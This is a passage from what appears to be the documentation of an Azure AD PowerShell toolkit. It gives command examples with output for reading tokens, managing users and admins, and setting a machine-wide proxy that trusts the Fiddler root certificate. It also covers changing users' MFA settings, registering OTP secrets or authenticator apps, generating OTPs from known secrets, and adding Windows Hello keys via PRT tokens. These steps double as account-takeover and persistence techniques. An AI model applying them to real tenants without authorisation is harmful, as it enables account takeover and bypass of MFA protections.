sub                 : SaN7kFxdXhzQN6B7C8ThGEg4gBIrcXo3lzcayeoReps
tenant_region_scope : EU
tid                 : 6217f557-602d-4fc8-b2f9-5cb948f6ce26
unique_name         : admin@company.onmicrosoft.com
upn                 : admin@company.onmicrosoft.com
uti                 : bH3Bzy9D5ESLcW_S0KkoAA
ver                 : 1.0
</code></pre>

<p><strong>Example2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Show access token information</span>
<span class="nb">Read-AADIntAccesstoken</span> <span class="nv">$at</span> <span class="n">-Validate</span>
</code></pre></div>
<p></p>

<p><strong>Output1:</strong></p>

<pre><code>Read-Accesstoken : Access Token is expired
    At line:1 char:1
    + Read-Accesstoken -AccessToken $at -Validate -verbose
    + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorException
        + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorException,Read-Accesstoken
		
aud                 : https://graph.windows.net
iss                 : https://sts.windows.net/fe177079-66f4-4f9f-bcb6-e085b92e3c8a/
iat                 : 1540478026
nbf                 : 1540478026
exp                 : 1540481926
acr                 : 1
aio                 : ASQA2/8JAAAAXhS3vMo2OGlXvBZG0tScm9njsJUDhvoHtwdSlUx2Jvg=
amr                 : {pwd}
appid               : 1b730954-1685-4b74-9bfd-dac224a7b894
appidacr            : 0
family_name         : demo
given_name          : admin
ipaddr              : 127.0.0.1
name                : admin demo
oid                 : 69be7da7-e29f-4753-b8c7-0417a63a1804
puid                : 1003BFFDABE606EE
scp                 : user_impersonation
sub                 : SaN7kFxdXhzQN6B7C8ThGEg4gBIrcXo3lzcayeoReps
tenant_region_scope : EU
tid                 : 6217f557-602d-4fc8-b2f9-5cb948f6ce26
unique_name         : admin@company.onmicrosoft.com
upn                 : admin@company.onmicrosoft.com
uti                 : bH3Bzy9D5ESLcW_S0KkoAA
ver                 : 1.0
</code></pre>

<h3 id="get-aadintimmutableid">Get-AADIntImmutableID (*)</h3>

<p>This function returns ImmutableId for the given ADUser -object. Must be run on a computer having <strong>ActiveDirectory</strong> -module</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get ADUser object</span>
<span class="nv">$user</span><span class="p">=</span><span class="nb">Get-ADUser</span> <span class="s2">"myuser"</span>

<span class="c"># Get ImmutableId for the ADUser</span>
<span class="nb">Get-AADIntImmutableID</span> <span class="n">-ADUser</span> <span class="nv">$user</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Zjk1OGUxZTctNDE4ZS00Njk5LTg1ZjgtN2YyNGM2NTcwNW==
</code></pre>

<h3 id="start-aadintcloudshell-c">Start-AADIntCloudShell ( C)</h3>

<p>Since version 0.4.3<br>
Starts an Azure Cloud Shell (PowerShell) session for the given user. Use <strong>-shell bash</strong> parameter to start Bash session.</p>

<p><strong>Note!</strong> Does not work with VSCode or ISE.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForCloudShell</span> <span class="n">-SaveToCache</span>

<span class="c"># Start the cloud shell (PowerShell)</span>
<span class="nb">Start-AADIntCloudShell</span>
</code></pre></div>
<p></p>

<h3 id="set-aadintproxysettings">Set-AADIntProxySettings</h3>

<p>Since version 0.6.6<br></p>

<p>Sets proxy settings of the local Windows machine for:</p>

<ul>
<li>.NET Framework (both 32 &amp; 64 bit) by editing machine.config</li>
<li>LocalSystem using BITSAdmin</li>
<li>NetworkService using BITSAdmin</li>
<li>winhttp using netsh</li>
<li>Local user by modifying registry</li>
<li>Machine level by modifying registry</li>
<li>Force machine level proxy by modifying registry</li>
</ul>

<p>Trusts Fiddler root certificate by importing it to Local Machine truster root certificates</p>

<p><strong>Example 1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Set proxy settings</span>
<span class="nb">Set-AADIntProxySettings</span> <span class="n">-ProxyAddress</span> <span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">10</span><span class="p">:</span><span class="n">8080</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>Setting proxies for x86 &amp; x64 .NET Frameworks:
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\Config\machine.config
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\machine.config
Setting proxy for LocalSystem:

BITSADMIN version 3.0
BITS administration utility.
(C) Copyright Microsoft Corp.

Internet proxy settings for account LocalSystem were set.
(connection = default)

Proxy usage set to       Manual_proxy
Proxy list set to        http://10.0.0.1:8080
Proxy bypass list set to &lt;empty&gt;
Setting proxy for NetworkService:

BITSADMIN version 3.0
BITS administration utility.
(C) Copyright Microsoft Corp.

Internet proxy settings for account NetworkService were set.
(connection = default)

Proxy usage set to       Manual_proxy
Proxy list set to        http://10.0.0.1:8080
Proxy bypass list set to &lt;empty&gt;
Setting winhttp proxy:

Current WinHTTP proxy settings:

	Proxy Server(s) :  10.0.0.1:8080
	Bypass List     :  (none)

Setting the proxy of local user Internet Settings:
VERBOSE: Performing the operation "Set Property" on target "Item: HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Connections Property: DefaultConnectionSettings".
VERBOSE: Performing the operation "Set Property" on target "Item: HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Connections Property: SavedLegacySettings".
Setting the proxy of machine Internet Settings:
VERBOSE: Performing the operation "Set Property" on target "Item: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Connections Property: DefaultConnectionSettings".
VERBOSE: Performing the operation "Set Property" on target "Item: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Connections Property: SavedLegacySettings".
Setting machine level procy policy for Internet Settings:
VERBOSE: Performing the operation "Set Property" on target "Item: HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings Property: ProxySettingsPerUser".
</code></pre>

<p><strong>Example 2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Set proxy settings and trust Fiddler root certificate</span>
<span class="nb">Set-AADIntProxySettings</span> <span class="n">-ProxyAddress</span> <span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">10</span><span class="p">:</span><span class="n">8080</span> <span class="n">-TrustFiddler</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>Setting proxies for x86 &amp; x64 .NET Frameworks:
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\Config\machine.config
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\machine.config
Setting proxy for LocalSystem:

BITSADMIN version 3.0
BITS administration utility.
(C) Copyright Microsoft Corp.

Internet proxy settings for account LocalSystem were set.
(connection = default)

Proxy usage set to       Manual_proxy
Proxy list set to        http://10.0.0.1:8080
Proxy bypass list set to &lt;empty&gt;
Setting proxy for NetworkService:

BITSADMIN version 3.0
BITS administration utility.
(C) Copyright Microsoft Corp.

Internet proxy settings for account NetworkService were set.
(connection = default)

Proxy usage set to       Manual_proxy
Proxy list set to        http://10.0.0.1:8080
Proxy bypass list set to &lt;empty&gt;
Setting winhttp proxy:

Current WinHTTP proxy settings:

	Proxy Server(s) :  10.0.0.1:8080
	Bypass List     :  (none)

Setting the proxy of local user Internet Settings:
VERBOSE: Performing the operation "Set Property" on target "Item: HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Connections Property: DefaultConnectionSettings".
VERBOSE: Performing the operation "Set Property" on target "Item: HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Connections Property: SavedLegacySettings".
Setting the proxy of machine Internet Settings:
VERBOSE: Performing the operation "Set Property" on target "Item: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Connections Property: DefaultConnectionSettings".
VERBOSE: Performing the operation "Set Property" on target "Item: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Connections Property: SavedLegacySettings".
Setting machine level procy policy for Internet Settings:
VERBOSE: Performing the operation "Set Property" on target "Item: HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings Property: ProxySettingsPerUser".
Trusting Fiddler root certificate:


   PSParentPath: Microsoft.PowerShell.Security\Certificate::LocalMachine\Root

Thumbprint                                Subject                                                              
----------                                -------                                                              
33D6FCEE2850DC53EEED517F3E8E72EB944BD467  CN=DO_NOT_TRUST_FiddlerRoot, O=DO_NOT_TRUST, OU=Created by http://...

</code></pre>

<h2 id="user-manipulation">User manipulation</h2>

<p><strong>User manipulation</strong> functions provide the basic user adding/editing/deleting functionality and some extras.</p>

<h3 id="get-aadintusers-a">Get-AADIntUsers (A)</h3>

<p>This function returns users of the tenant.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get users</span>
<span class="nb">Get-AADIntUsers</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">UserPrincipalName</span><span class="p">,</span><span class="n">ObjectId</span><span class="p">,</span><span class="n">ImmutableId</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>UserPrincipalName                                               ObjectId                             ImmutableId             
-----------------                                               --------                             -----------  
LeeG@company.com                                                2eee0a36-9e2f-4985-80e1-4172ed8b3213 7jYndBUFCEqlXQNZEO3uwQ==
LidiaH@company.com                                              34289155-2798-432d-9398-53e7e0918f38 W3clIieLs0ivUeoY1lu1fg==
AllanD@company.com                                              3a0eea57-9f74-4ee5-8e84-353c35581cc2 BzPotuy3G0ySBJN5tZwB4w==
</code></pre>

<h3 id="get-aadintuser-a">Get-AADIntUser (A)</h3>

<p>This function returns information for the given user.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get user information</span>
<span class="nb">Get-AADIntUser</span> <span class="n">-UserPrincipalName</span> <span class="s2">"LeeG@company.com"</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>AlternateEmailAddresses                : 
AlternateMobilePhones                  : 
AlternativeSecurityIds                 : 
BlockCredential                        : false
City                                   : 
CloudExchangeRecipientDisplayType      : 1073741824
Country                                : 
Department                             : Manufacturing
DirSyncProvisioningErrors              : 
DisplayName                            : Lee Gu
Errors                                 : 
Fax                                    : 
FirstName                              : Lee
ImmutableId                            : 7jYndBUFCEqlXQNZEO3uwQ==
IndirectLicenseErrors                  : 
IsBlackberryUser                       : false
IsLicensed                             : true
LastDirSyncTime                        : 2018-06-26T11:04:16Z
LastName                               : Gu
LastPasswordChangeTimestamp            : 2017-10-03T04:44:43Z
LicenseAssignmentDetails               : LicenseAssignmentDetails
LicenseReconciliationNeeded            : false
Licenses                               : Licenses
LiveId                                 : 1003BFFDABE61DB7
MSExchRecipientTypeDetails             : 
MSRtcSipDeploymentLocator              : 
MSRtcSipPrimaryUserAddress             : 
MobilePhone                            : 
OathTokenMetadata                      : 
ObjectId                               : 2eee0a36-9e2f-4985-80e1-4172ed8b3213
Office                                 : 23/3101
OverallProvisioningStatus              : PendingInput
PasswordNeverExpires                   : true
PasswordResetNotRequiredDuringActivate : true
PhoneNumber                            : +1 913 555 0101
PortalSettings                         : 
PostalCode                             : 66210
PreferredDataLocation                  : 
PreferredLanguage                      : 
ProxyAddresses                         : ProxyAddresses
ReleaseTrack                           : 
ServiceInformation                     : 
SignInName                             : LeeG@company.com
SoftDeletionTimestamp                  : 
State                                  : KS
StreetAddress                          : 10801 Mastin Blvd., Suite 620
StrongAuthenticationMethods            : 
StrongAuthenticationPhoneAppDetails    : 
StrongAuthenticationProofupTime        : 
StrongAuthenticationRequirements       : 
StrongAuthenticationUserDetails        : 
StrongPasswordRequired                 : true
StsRefreshTokensValidFrom              : 2017-10-03T04:44:43Z
Title                                  : Director
UsageLocation                          : FI
UserLandingPageIdentifierForO365Shell  : 
UserPrincipalName                      : LeeG@company.com
UserThemeIdentifierForO365Shell        : 
UserType                               : Member
ValidationStatus                       : Healthy
WhenCreated                            : 2018-06-26T11:04:14Z
</code></pre>

<h3 id="new-aadintuser-a">New-AADIntUser (A)</h3>

<p>This function creates a new user. <strong>Currently supports only UserPrincipalName and DisplayName</strong>.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get login information for a domain</span>
<span class="nb">New-AADIntUser</span> <span class="n">-UserPrincipalName</span> <span class="s2">"user@company.com"</span> <span class="n">-DisplayName</span> <span class="s2">"New User"</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>AlternateEmailAddresses                : 
AlternateMobilePhones                  : 
AlternativeSecurityIds                 : 
BlockCredential                        : false
City                                   : 
CloudExchangeRecipientDisplayType      : 
Country                                : 
Department                             : 
DirSyncProvisioningErrors              : 
DisplayName                            : New User
Errors                                 : 
Fax                                    : 
FirstName                              : 
ImmutableId                            : 
IndirectLicenseErrors                  : 
IsBlackberryUser                       : false
IsLicensed                             : false
LastDirSyncTime                        : 
LastName                               : 
LastPasswordChangeTimestamp            : 2018-10-25T15:13:10.8686574Z
LicenseAssignmentDetails               : 
LicenseReconciliationNeeded            : false
Licenses                               : 
LiveId                                 : 1003BFFDAEE167C0
MSExchRecipientTypeDetails             : 
MSRtcSipDeploymentLocator              : 
MSRtcSipPrimaryUserAddress             : 
MobilePhone                            : 
OathTokenMetadata                      : 
ObjectId                               : 13e121db-4132-43c8-a784-a9b12f2bd4e3
Office                                 : 
OverallProvisioningStatus              : None
PasswordNeverExpires                   : false
PasswordResetNotRequiredDuringActivate : 
PhoneNumber                            : 
PortalSettings                         : 
PostalCode                             : 
PreferredDataLocation                  : 
PreferredLanguage                      : 
ProxyAddresses                         : 
ReleaseTrack                           : 
ServiceInformation                     : 
SignInName                             : new.user@company.com
SoftDeletionTimestamp                  : 
State                                  : 
StreetAddress                          : 
StrongAuthenticationMethods            : 
StrongAuthenticationPhoneAppDetails    : 
StrongAuthenticationProofupTime        : 
StrongAuthenticationRequirements       : 
StrongAuthenticationUserDetails        : 
StrongPasswordRequired                 : true
StsRefreshTokensValidFrom              : 2018-10-25T15:13:10.8686574Z
Title                                  : 
UsageLocation                          : 
UserLandingPageIdentifierForO365Shell  : 
UserPrincipalName                      : new.user@company.com
UserThemeIdentifierForO365Shell        : 
UserType                               : Member
ValidationStatus                       : Healthy
WhenCreated                            : 
Password                               : Tog59451
</code></pre>

<h3 id="set-aadintuser-a">Set-AADIntUser (A)</h3>

<p>This function changes user’s information.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Set user information</span>
<span class="nb">Set-AADIntUser</span> <span class="n">-UserPrincipalName</span> <span class="s2">"user@company.com"</span> <span class="n">-FirstName</span> <span class="s2">"Dave"</span>
</code></pre></div>
<p></p>

<h3 id="remove-aadintuser-a">Remove-AADIntUser (A)</h3>

<p>This function removes a user.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Remove the user</span>
<span class="nb">Remove-AADIntUser</span> <span class="n">-UserPrincipalName</span> <span class="s2">"user@company.com"</span>
</code></pre></div>
<p></p>

<h3 id="get-aadintglobaladmins-a">Get-AADIntGlobalAdmins (A)</h3>

<p>This function returns all Global Admins of the tenant.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get global admins</span>
<span class="nb">Get-AADIntGlobalAdmins</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>DisplayName    UserPrincipalName                 
-----------    -----------------                 
admin demo     admin@company.onmicrosoft.com
Dave the Admin dave@company.com            
</code></pre>

<h2 id="user-mfa-manipulation">User MFA manipulation</h2>

<h3 id="get-aadintusermfa-a">Get-AADIntUserMFA (A)</h3>

<p>Since version 0.2.8 <br>
Gets user’s MFA settings</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the access token</span>
<span class="nb">Get-AADIntAccessTokenForAADGraph</span> <span class="n">-SaveToCache</span>
    
<span class="c"># Get user's MFA settings </span>
<span class="nb">Get-AADIntUserMFA</span> <span class="n">-UserPrincipalName</span> <span class="s2">"user@company.com"</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>UserPrincipalName      : user@company.com
State                  : Enforced
PhoneNumber            : +1 123456789
AlternativePhoneNumber : +358 123456789
Email                  : someone@hotmail.com
DefaultMethod          : OneWaySMS
Pin                    : 
OldPin                 : 
StartTime              :          
</code></pre>

<h3 id="set-aadintusermfa-a">Set-AADIntUserMFA (A)</h3>

<p>Since version 0.2.8 <br>
Sets user’s MFA settings</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the access token</span>
<span class="nb">Get-AADIntAccessTokenForAADGraph</span> <span class="n">-SaveToCache</span>
    
<span class="c"># Set user's MFA settings </span>
<span class="nb">Set-AADIntUserMFA</span> <span class="n">-UserPrincipalName</span> <span class="s2">"user@company.com"</span> <span class="n">-PhoneNumber</span> <span class="s2">"+1 123456789"</span> <span class="n">-DefaultMethod</span> <span class="n">PhoneAppNotification</span>
</code></pre></div>
<p></p>

<h3 id="get-aadintusermfaapps-a">Get-AADIntUserMFAApps (A)</h3>

<p>Since version 0.4.0 <br>
Gets user’s MFA Authentication App settings</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the access token</span>
<span class="nb">Get-AADIntAccessTokenForAADGraph</span> <span class="n">-SaveToCache</span>
    
<span class="c"># Get user's MFA apps settings </span>
<span class="nb">Get-AADIntUserMFAApps</span> <span class="n">-UserPrincipalName</span> <span class="s2">"user@company.com"</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>AuthenticationType : Notification, OTP
DeviceName         : SM-R2D2
DeviceTag          : SoftwareTokenActivated
DeviceToken        : APA91...
Id                 : 454b8d53-d97e-4ead-a69c-724166394334
NotificationType   : GCM
OathTokenTimeDrift : 0
OathSecretKey      :
PhoneAppVersion    : 6.2001.0140
TimeInterval       :

AuthenticationType : OTP
DeviceName         : NO_DEVICE
DeviceTag          : SoftwareTokenActivated
DeviceToken        : NO_DEVICE_TOKEN
Id                 : aba89d77-0a69-43fa-9e5d-6f41c7b9bb16
NotificationType   : Invalid
OathTokenTimeDrift : 0
OathSecretKey      :
PhoneAppVersion    : NO_PHONE_APP_VERSION
TimeInterval       :         
</code></pre>

<h3 id="set-aadintusermfaapps-a">Set-AADIntUserMFAApps (A)</h3>

<p>Since version 0.4.0 <br>
Sets user’s MFA Authentication App settings.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Set user's MFA apps settings </span>
<span class="nb">Set-AADIntUserMFAApps</span> <span class="n">-UserPrincipalName</span> <span class="s2">"user@company.com"</span> <span class="n">-Id</span> <span class="n">454b8d53-d97e</span><span class="p">-</span><span class="n">4ead-a69c</span><span class="p">-</span><span class="n">724166394334</span> <span class="n">-DeviceName</span> <span class="s2">"SM-3CPO"</span>
</code></pre></div>
<p></p>

<h3 id="register-aadintmfaapp-my">Register-AADIntMFAApp (MY)</h3>

<p>Since version 0.4.0 <br>
Registers AADInternals Authenticator App or OTP appfor the user.</p>

<p>Requirements for App:</p>

<ul>
<li>AADInternals Authentication app is installed.</li>
<li>Device Token is copied from the app.</li>
<li>The user have registered at least one MFA method, e.g. SMS. This is because Access Token creation performs MFA.</li>
<li>Registration is done through <a href="https://mysignins.microsoft.com">https://mysignins.microsoft.com</a> so “Users can use the combined security information registration experience” MUST be activated for the tenant.</li>
</ul>

<p><strong>Example1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Save the Device Token of AADInternals Authentication app to a variable</span>
<span class="nv">$deviceToken</span> <span class="p">=</span> <span class="s2">"APA91bEGIvk1CCg1VIj_YQ_L8fn59UD6...mvXYxlWM6s90_Ct_fpo7iE3uF8hTb"</span>

<span class="c"># Get the access token</span>
<span class="nb">Get-AADIntAccessTokenForMySignins</span> <span class="n">-SaveToCache</span>

<span class="c"># Register the new app</span>
<span class="nb">Register-AADIntMFAApp</span> <span class="n">-DeviceToken</span> <span class="p">-</span><span class="nv">$deviceToken</span> <span class="n">-DeviceName</span> <span class="s2">"My MFA App"</span> <span class="n">-Type</span> <span class="n">APP</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>DefaultMethodOptions : 1
DefaultMethod        : 0
Username             : user@company.com
TenantId             : 9a79b12c-f563-4bdc-9d18-6e6d0d52f73b
AzureObjectId        : dce60ee2-d907-4478-9f36-de3d74708381
ConfirmationCode     : 1481770594613653
OathTokenSecretKey   : dzv5osvdx6dhtly4av2apcts32eqh4bg
OathTokenEnabled     : true
</code></pre>

<p><strong>Example2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the access token</span>
<span class="nb">Get-AADIntAccessTokenForMySignins</span> <span class="n">-SaveToCache</span>

<span class="c"># Register the new OTP</span>
<span class="nb">Register-AADIntMFAApp</span> <span class="n">-Type</span> <span class="n">OTP</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>OathSecretKey    DefaultMethodOptions DefaultMethod
-------------    -------------------- -------------
5bhbqsrb6ft5rxdx                    1             0
</code></pre>

<h3 id="new-aadintotpsecret">New-AADIntOTPSecret</h3>

<p>Since version 0.4.0 <br>
Generates a one-time-password (OTP) secret which can be used to reset user’s OathSecretKey.</p>

<p><strong>Note!</strong> Set only to “apps” which AuthenticationType is OTP!</p>

<p><strong>Example 1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Generate a new OTP secret </span>
<span class="nb">New-AADIntOTPSecret</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>njny7gdb6tnfihy3
</code></pre>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Change the user's OathSecretKey </span>
<span class="nb">Set-AADIntUserMFAApps</span> <span class="n">-UserPrincipalName</span> <span class="s2">"user@company.com"</span> <span class="n">-Id</span> <span class="n">aba89d77</span><span class="p">-</span><span class="n">0a69</span><span class="p">-</span><span class="n">43fa</span><span class="p">-</span><span class="n">9e5d</span><span class="p">-</span><span class="n">6f41c7b9bb16</span> <span class="n">-OathSecretKey</span> <span class="s2">"njny7gdb6tnfihy3"</span>
</code></pre></div>


<p><strong>Example 2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Generate OTP secret </span>
<span class="nb">New-AADIntOTPSecret</span> <span class="n">-Clipboard</span>
</code></pre></div>

<strong>Output</strong><p></p>

<pre><code>OTP secret copied to clipboard.
</code></pre>

<h3 id="new-aadintotp">New-AADIntOTP</h3>

<p>Since version 0.4.0 <br>
Generates a one-time-password (OTP) using the given secret. Can be used for MFA if the user’s secret is known.</p>

<p><strong>Example 1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Generate OTP </span>
<span class="nb">New-AADIntOTP</span> <span class="n">-SecretKey</span> <span class="s2">"rrc2 wntz dkbu iikb"</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>OTP     Valid
---     -----
502 109 26s
</code></pre>

<p><strong>Example 2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Generate OTP </span>
<span class="nb">New-AADIntOTP</span> <span class="n">-SecretKey</span> <span class="s2">"rrc2 wntz dkbu iikb"</span> <span class="n">-Clipboard</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>OTP copied to clipboard, valid for 26s
</code></pre>

<h3 id="set-aadintdevicewhfbkey">Set-AADIntDeviceWHfBKey</h3>

<p>Since version 0.9.0 <br>
Sets a Windows Hello for Business (WHfB) key of the device.</p>

<p><strong>Example 1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get PRTToken of the current user</span>
<span class="nv">$prttoken</span> <span class="p">=</span> <span class="nb">Get-AADIntUserPRTToken</span>

<span class="c"># Get Access Token using the PRTToken</span>
<span class="nb">Get-AADIntAccessTokenForWHfB</span> <span class="n">-PRTToken</span> <span class="nv">$prttoken</span> <span class="n">-SaveToCache</span>

<span class="c"># Create a new WHfB key and add it to the device</span>
<span class="nb">Set-AADIntDeviceWHfBKey</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>Device Window Hello for Business key successfully added to the user:
DeviceId:       b27db620-2673-4dac-a565-cec81bfafbaa
Key Id:         a07b4c9c-1515-4d79-9ce2-7f7954049adf
UPN:            user@company.com
Key file name : "b27db620-2673-4dac-a565-cec81bfafbaa_a07b4c9c-1515-4d79-9ce2-7f7954049adf_user@company.com_whfb.pem"
</code></pre>

<p><strong>Example 2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token for AADJoin</span>
<span class="nb">Get-AADIntAccessTokenForAADJoin</span> <span class="n">-SaveToCache</span>

<span class="c"># Join the device</span>
<span class="nb">Join-AADIntDeviceToAzureAD</span> <span class="n">-JoinType</span> <span class="n">Join</span> <span class="n">-DeviceName</span> <span class="s2">"My device"</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>Device successfully registered to Azure AD:
	DisplayName:     "My device"
	DeviceId:        b27db620-2673-4dac-a565-cec81bfafbaa
	ObjectId:        4fbbb5f6-1563-4237-974c-dfabcc5c533c
	TenantId:        01a09bec-7584-45a5-8048-e7f1b4181f20
	Cert thumbprint: 593E3D7F8F8CE0DB74725EE3B5AC1B5F58D92994
	Cert file name : "b27db620-2673-4dac-a565-cec81bfafbaa.pfx"
Local SID:
	S-1-5-32-544
Additional SIDs:
	S-1-12-1-1173396554-1264637767-1283444156-383767028
	S-1-12-1-727559687-1332680371-478291341-2778853572
	S-1-12-1-1337701878-1110906211-2883538071-1012096204
</code></pre>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get PRT and Session key</span>
<span class="nv">$prtkeys</span> <span class="p">=</span> <span class="nb">Get-AADIntUserPRTKeys</span> <span class="n">-PfxFileName</span> <span class="p">.\</span><span class="n">b27db620</span><span class="p">-</span><span class="n">2673</span><span class="p">-</span><span class="n">4dac-a565-cec81bfafbaa</span><span class="p">.</span><span class="n">pfx</span>
</code></pre></div>


<pre><code>Keys saved to b27db620-2673-4dac-a565-cec81bfafbaa.json
</code></pre>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Create a new PRTToken using PRT and Session key</span>
<span class="nv">$prttoken</span> <span class="p">=</span> <span class="nb">New-AADIntUserPRTToken</span> <span class="n">-Settings</span> <span class="nv">$prtkeys</span>

<span class="c"># Get access token for WHfB</span>
<span class="nb">Get-AADIntAccessTokenForWHfB</span> <span class="n">-PRTToken</span> <span class="nv">$prttoken</span> <span class="n">-SaveToCache</span>

<span class="c"># Add the provided WHfB key to the given user</span>
<span class="nb">Set-AADIntDeviceWHfBKey</span> <span class="n">-PfxFileName</span> <span class="p">.\</span><span class="n">b27db620</span><span class="p">-</span><span class="n">2673</span><span class="p">-</span><span class="n">4dac-a565-cec81bfafbaa</span><span class="p">.</span><span class="n">pfx</span>
</code></pre></div>


<pre><code>Device Window Hello for Business key successfully added to the user:
DeviceId:       b27db620-2673-4dac-a565-cec81bfafbaa
Key Id:         a07b4c9c-1515-4d79-9ce2-7f7954049adf
UPN:            user@company.com
</code></pre>

<h2 id="user-manipulation-with-ad-sync-api">User manipulation with AD sync api</h2>

<p>These functions provide some functionality allowing manipulation of Azure AD objects otherwise impossible.</p>

<p><strong>NOTE!</strong> these function uses Azure AD synchronization API and may cause severe harm to the tenant!! <strong>USE ON YOUR OWN RISK!</strong></p>

<h3 id="get-aadintsyncobjects-a">Get-AADIntSyncObjects (A)</h3>

<p>This function returns all Azure AD objects that are not synced to the on-premises AD.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get synchronisable objects from AAD</span>
<span class="nb">Get-AADIntSyncObjects</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">UserPrincipalName</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>UserPrincipalName          
-----------------          
BrianJ@company.com            
LynneR@company.com                        
MiriamG@company.com                       
AllanD@company.com                        
IsaiahL@company.com               
</code></pre>

<h3 id="set-aadintazureadobject-a">Set-AADIntAzureADObject (A)</h3>

<p>This function creates new OR modifies existing Azure AD object.</p>

<p>Allows setting all Azure AD attributes. The <strong>sourceAnchor</strong> attribute is the most important one and is automatically set only to synced users.
This is typically the ImmutableID (Base64 encoded on-prem AD object’s GUID), but can be any string that is unique tenant wide.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Create a new user</span>
